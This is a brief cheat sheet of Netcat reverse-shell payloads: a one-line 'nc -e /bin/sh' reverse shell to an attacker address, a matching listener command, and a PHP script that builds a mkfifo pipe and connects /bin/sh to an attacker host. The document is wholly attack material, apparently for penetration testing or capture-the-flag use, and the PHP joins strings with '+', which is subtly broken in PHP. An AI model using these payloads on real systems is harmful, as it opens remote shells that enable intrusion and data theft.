# Netcat

## Generic reverse shell
nc 10.10.14.36 4444 -e /bin/sh

## Listener
nc -lnvp 4444

## PHP mkfifo reverse shell
```php
<?php
    // Attacker IP
    $lhost = '10.0.0.1';
    // Attacker port
    $lport = '4444';
    // Directory on victim to mkfifo netcat
    $rdir = '/tmp/f';
    echo 'Running';
    // Payload
    system('rm '+$rdir+';mkfifo '+$rdir+';cat '+$rdir+'|/bin/sh -i 2>&1|nc '+$lhost+' '+$lport+' >'+$rdir+'');
    echo ' ... Done'; 
?>
```
